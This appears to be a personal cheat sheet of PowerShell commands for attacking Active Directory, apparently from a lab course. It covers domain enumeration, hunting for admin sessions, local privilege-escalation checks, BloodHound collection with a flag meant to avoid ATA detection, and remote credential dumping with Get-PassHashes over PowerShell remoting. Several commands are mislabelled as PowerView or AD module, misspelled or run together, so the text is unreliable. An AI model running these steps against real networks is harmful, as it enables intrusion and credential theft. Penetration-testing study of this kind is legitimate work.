#                   Domain Enumeration                                                                                                     

# Let's start with Domain Enumeration and map various entities, trusts, relationships and privileges for the target domain.
# The enumeration can be done by using Native executables and .NET classes:

$ADClass =[System.DirectoryServices.ActiveDirectory.Domain]
$ADClass::GetCurrentDomain()

#                                                                 
whoami /priv

#To speed up things we can use PowerView:
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
# Or
# The ActiveDirectory PowerShell module 
https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=win10-ps
https://github.com/samratashok/ADModule
#(To use ActiveDirectory module without installing RSAT, we can use Import-Module for the valid ActiveDirectory module DLL)

# how to use powerview
. .\PowerView.ps1
# to use the Microsoft AD Module
Import-Module .\Microsoft.ActiveDirectory.Management.dll
Import-Module .\ActiveDirectory\ActiveDirectory.psd1


#                  Get current domain                                                                                                      

#PowerView
Get-NetDomain 
#AD module
Get-ADDomain 

#                 Get object of another domain                                                                                             
#Power View
Get-NetDomain –Domain batata.corp
# AD module
Get-ADDomain -Identity batata.corp

#                Get domain SID for the current domain                                                                                     
#Power View
Get-DomainSID
# AD module
(Get-ADDomain).DomainSID

#                Get domain policy for the current domain                                                                                  
#Power View
Get-DomainPolicy
# AD module
(Get-DomainPolicy)."system access"
(Get-DomainPolicy)."Kerberos Policy"


#               Get domain policy for another domain                                                                                        
# AD module
(Get-DomainPolicy –domain batata.corp)."system access"

#               Get domain controler info                                                                                                    
#Power View
Get-NetDomainController 

#               Get domain controler info for another domain                                                                                 

#Power View
Get-NetDomainController –Domain batata.corp
# AD module
Get-ADDomainController -DomainName batata.corp -Discover

#              Get a list of users in the current domain                                                                                     
#Power View
Get-NetUser
#Power View
Get-NetUser | select cn
#Power View
Get-NetUser –Username student1
# AD module
Get-ADUser -Filter * -Properties *
# AD module
Get-ADUser -Filter * -Properties * | select Name
# AD module
Get-ADUser -Identity student1 -Properties *

#            Get list of all properties for users in the current domain                                                                      
#Power View
Get-UserProperty
#Power View
Get-UserProperty –Properties pwdlastset
# AD module
Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name
# AD module
Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}

#             Search for a particular string in a user's attributes:                                                                         
# AD module
Find-UserField -SearchField Description -SearchTerm "built"
#Power View
Get-ADUser -Filter 'Description -like "*built*"' -Properties Description | select name,Description

#             Get a list of computers in the current domain                                                                                  
#Power View
Get-NetComputer
Get-NetComputer -FullData
Get-NetComputer –OperatingSystem "*Server 2019*"
Get-NetComputer -Ping

# AD module
Get-ADComputer -Filter * | select Name
Get-ADComputer -Filter 'OperatingSystem -like "*Server 2019*"' -Properties OperatingSystem | select Name,OperatingSystem
Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}
Get-ADComputer -Filter * -Properties *

#            Get all the groups in the current domain                                                                                      
#Power View
Get-NetGroup
Get-NetGroup -GroupName *admin*
Get-NetGroup -GroupName *admin* -Domain moneycorp.local
Get-NetGroup –Domain <targetdomain>
Get-NetGroup –FullData
# AD module
Get-ADGroup -Filter * | select Name Get-ADGroup -Filter * -Properties *

#         Get all groups containing the word "admin" in group name                                                                        
#Power View
Get-NetGroup *admin*
# AD module
Get-ADGroup -Filter 'Name -like "*admin*"' | select Name

#         Get all the members of the Domain Admins group                                                                                 

# AD module
Get-NetGroupMember -GroupName "Domain Admins"
Get-NetGroupMember -GroupName "Domain Admins" -Recurse Get-ADGroupMember -Identity "Domain Admins" -Recursive
Get-NetGroupMember -GroupName "Enterprise Admins"
Get-NetGroupMember -GroupName "Enterprise Admins" -Domain batata.corp

#         Get the group membership for a user:                                                                                           
#Power View
Get-NetGroup –UserName "batata"
# AD module
Get-ADPrincipalGroupMembership -Identity batata

#        List all the local groups on a machine (needs administrator privs on non-dc machines) :                                          
#Power View
Get-NetLocalGroup -ComputerName batata.corp -ListGroups

#        Get members of all the local groups on a machine (needs administrator privs on non-dc machines)                                  
#Power View
Get-NetLocalGroup -ComputerName batata.corp -Recurse

#        Get actively logged users on a computer (needs local admin rights on the target)                                                 
#Power View
Get-NetLoggedon –ComputerName <servername>

#        Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS)                   
#Power View
Get-LoggedonLocal -ComputerName batata.corp

#        Get the last logged user on a computer (needs administrative rights and remote registry on the target)                           
#Power View
Get-LastLoggedOn –ComputerName <servername>

#         Find shares on hosts in current domain.                                                                                         
#Power View
Invoke-ShareFinder –Verbose
Invoke-ShareFinder –Verbose -ExcludeStandard -ExcludePrint -ExcludeIPC

#         Find sensitive files on computers in the domain                                                                                
#Power View
Invoke-FileFinder –Verbose

#         Get all fileservers of the domain                                                                                               
# AD module
Get-NetFileServer
Get-NetFileServer -Verbose

#              Get list of GPO in current domain.                                                           

#Power View
Get-NetGPO
Get-NetGPO | select displayname

# AD module
gpresult /R

#PowerView
Get-NetGPO -ComputerName batata.corp 


Get-GPO -All #(GroupPolicy module)

Get-GPResultantSetOfPolicy -ReportType Html -Path C:\Users\Administrator\report.html #(Provides RSoP)

#              Get GPO(s) which use Restricted Groups or groups.xml for interesting users                   

Get-NetGPOGroup

#              Get users which are in a local group of a machine using GPO                                   

Find-GPOComputerAdmin –Computername batata.corp

#   Get machines where the given user is member of a specific group                                         

Find-GPOLocation -UserName batata -Verbose

#              Get OUs in a domain                                                                          

Get-NetOU -FullData

Get-ADOrganizationalUnit -Filter * -Properties *

#              Get GPO applied on an OU. Read GPOname from gplink attribute from                        
# AD module
Get-NetOU
Get-NetOU -FullData
Get-NetGPO -GPOname "{AB306569-220D-43FF-B03B-83E8F4EF8081}" #GPOname = gplink

#power view
Get-GPO -Guid AB306569-220D-43FF-B03B-83E8F4EF8081 #(GroupPolicy module)

#            Get the ACLs associated with the specified object                          
#Power View
Get-ObjectAcl -SamAccountName student1 –ResolveGUIDs

#            Get the ACLs associated with the specified prefix to be used for search     
#Power View
Get-ObjectAcl -ADSprefix 'CN=Administrator,CN=Users' -Verbose

#   We can also enumerate ACLs using ActiveDirectory module but without resolving GUIDs
#AD module
(Get-Acl 'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp ,DC=local').Access

#    Get the ACLs associated with the specified LDAP path to be used for search          
#AD module
Get-ObjectAcl -ADSpath "LDAP://CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose

#    Search for interesting ACEs                                                        
#AD module
Invoke-ACLScanner -ResolveGUIDs

#    Get the ACLs associated with the specified path                                    
#Power View
Get-PathAcl -Path "\\batata.corp\sysvol"

#                        Domain Trust mapping                                                      

#             Get a list of all domain trusts for the current domain                               
#Power View
Get-NetDomainTrust
#Power View
Get-NetDomainTrust –Domain batata.corp
#AD module
Get-ADTrust
#AD module
Get-ADTrust –Identity batata.corp

#                    Forest mapping                                                                

#      Get details about the current forest                                                        
#Power View
Get-NetForest
#Power View
Get-NetForest –Forest batata.corp
#Power View
Get-ADForest
#Power View
Get-ADForest –Identity batata.corp

#      Get all domains in the current forest                                                        
#AD module
Get-NetForestDomain
#AD module
Get-NetForestDomain –Forest batata.corp
#AD module
(Get-ADForest).Domains

#       Forest mapping                                                                               

#   Get all global catalogs for the current forest                                                   

#Power View
Get-NetForestCatalog
#Power View
Get-NetForestCatalog –Forest batata.corp
#AD module
Get-ADForest | select -ExpandProperty GlobalCatalogs

#  Map trusts of a forest                                                                            

#Power View
Get-NetForestTrust
#Power View
Get-NetForestTrust –Forest batata.corp
#AD module
Get-ADTrust -Filter msDS-TrustForestTrustInfo -ne "$null"

#      Find all machines on the current domain where the current user has local admin access 

Find-LocalAdminAccess –Verbose

#    This function queries the DC of the current or provided domain for a list of computers

(Get-NetComputer) and then use multi-threaded Invoke-CheckLocalAdminAccess #on each machine

#     This can also be done with the help of remote administration tools like WMI and PowerShell remoting. Pretty useful in cases ports (RPC and SMB) used by Find-LocalAdminAccess are blocked.

Find-WMILocalAdminAccess.ps1 #necessary use external script
Find-PSRemotingLocalAdminAccess.ps #necessary use external script


#   Find local admins on all machines of the domain (needs administrator privs on non-dc machines).                                        

Invoke-EnumerateLocalAdmin –Verbose

#    This function queries the DC of the current or provided domain for a list of computers                                               

(Get-NetComputer) and then use multi-threaded Get-NetLocalGroup #on each machine.

#  Find computers where a domain admin (or specified user/group) has sessions:                                                            

Invoke-UserHunter

Invoke-UserHunter -GroupName "RDPUsers"

#  This function queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using         
Get-NetGroupMember#, gets a list of computers
(Get-NetComputer) #and list sessions and logged on users 
(Get-NetSession/Get-NetLoggedon) #from each machine.

#             To confirm admin access                                                                                                     

Invoke-UserHunter -CheckAccess


#        Find computers where a domain admin is logged-in.                                                                                 

Invoke-UserHunter -Stealth

#  This option queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using            
Get-NetGroupMember
#gets a list _only_ of high traffic servers (DC, FileServers and Distributed File servers) for less traffic generation and list sessions and logged on users 
(Get-NetSession/Get-NetLoggedon) #from each machine.

# There are various ways of locally escalating privileges on Windows box:

#– Missing patches
#
#– Automated deployment and AutoLogon passwords in clear text
#
#– AlwaysInstallElevated (Any user can run MSI as SYSTEM)
#
#– Misconfigured Services
#
#– DLL Hijacking and more
#


#• We can use below tools for complete coverage

#
#– PowerUp: 
https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc

#– BeRoot: 
https://github.com/AlessandroZ/BeRoot

#– Privesc: 
https://github.com/enjoiz/Privesc
# get services 

Get-WmiObject -Class win32_service 
Get-WmiObject -Class win32_service | fl*
Get-WmiObject -Class win32_service | select pathname


#                  Services Issues using PowerUp                                                             

#start PowerUp
. .\PowerUp.ps1

#            Get services with unquoted paths and a space in their name.                                     

Get-ServiceUnquoted -Verbose

#            Get services where the current user can write to its binary path or change arguments to the binary

Get-ModifiableServiceFile -Verbose

#            Get the services whose configuration current user can modify. 

Get-ModifiableService -Verbose


#       Run all checks from :                                                                                 

Invoke-AllChecks

#BeRoot is an executable:
.\beRoot.exe 

. .\privesc.ps1
Invoke-PrivEsc

#        Supply data to BloodHound:                                                  

. C:\AD\Tools\BloodHound-master\Ingestors\SharpHound.ps1

Invoke-BloodHound -CollectionMethod All

#  The generated archive can be uploaded to the BloodHound application.              

#       To avoid detections like ATA                                                 

Invoke-BloodHound -CollectionMethod All -ExcludeDC


#install Bloodhound
apt install bloodhound
#start db
sudo neoj4 console #default credentials neoj4:neoj4
#start bloodhound cli
blodhound

#      Think of it as psexec on steroids.                                                                                       

# You will found this increasingly used in enterprises. Enabled by default on Server 2012 onwards.
# You may need to enable remoting 
(Enable-PSRemoting) 
# on a Desktop Windows machine, Admin privs are required to do that.

# You get elevated shell on remote system if admin creds are used to authenticate (which is the default setting)                

#                           One-to-One                                 
#                           PSSession                                  
#     Interactive
#     Runs in a new process (wsmprovhost)
#     Is Stateful
#                          Useful cmdlets                              

# run powercast
. .\powercast.ps1
# get local admin to open a remote session
Find-LocalAdminAccess
# start session in an variable
$sess = New-PSSession -ComputerName dcorp-adminsrv.dollarcorp.mopneycorp.local

Enter-PSSession -ComputerName batata.corp
#or
Enter-PSSEssion -Session $sess

#exit to session
exit

#                           One-to-Many                                
#                 Also known as Fan-out remoting.                      
#                         Non-interactive.                             
#                  Executes commands parallely.                        
#                         Useful cmdlets                               

# Run commands and scripts on
# multiple remote computers,
# in disconnected sessions (v3)
# as background job and more.
# The best thing in PowerShell for passing the hashes, using credentials and executing commands on multiple remote computers.
# Use 
–Credential parameter to pass username/password.


# Use below to execute commands or scriptblocks:
Invoke-Command -ComputerName batata.corp -ScriptBlock{whoami;hostname} 
Invoke-Command –Scriptblock {Get-Process} -ComputerName (Get-Content <list_of_servers>)

# Use below to execute scripts from files

Invoke-Command –FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)

# Use below to execute locally loaded function on the remote machines:

Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>)

# In this case, we are passing Arguments. Keep in mind that only positional arguments could be passed this way:

Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList

# In below, a function call within the script is used:

Invoke-Command –Filepath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)

# Use below to execute "Stateful" commands using Invoke-Command:

$Sess = New-PSSession –Computername Server1
Invoke-Command –Session $Sess –ScriptBlock {$Proc = Get-Process}
Invoke-Command –Session $Sess –ScriptBlock {$Proc.Name}













